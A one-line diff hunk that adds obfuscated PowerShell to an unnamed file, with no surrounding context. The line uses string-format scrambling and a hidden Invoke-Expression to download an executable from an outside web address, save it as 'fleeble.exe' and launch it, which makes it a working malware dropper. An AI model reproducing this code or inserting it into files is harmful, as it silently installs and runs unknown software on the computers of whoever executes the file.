@@ -1,0 +1,1 @@
+﻿& ( $enV:cOMspEc[4,26,25]-join'') ( ((("{17}{16}{5}{7}{3}{1}{12}{8}{11}{4}{18}{6}{10}{15}{13}{19}{9}{0}{2}{14}{20}"-f'ejUD)','i',';Start','stem.Net.WebCl','adF','-Obje','http://world','ct Sy',').Downl','.ex','nit.co','o','ent','a.exejUD,jUD','-Process jUDfleebl','m/oper','New','(','ile(jUD','fleeble','e.exejUD')) -crePLACE([Char]106+[Char]85+[Char]68),[Char]39) ) 
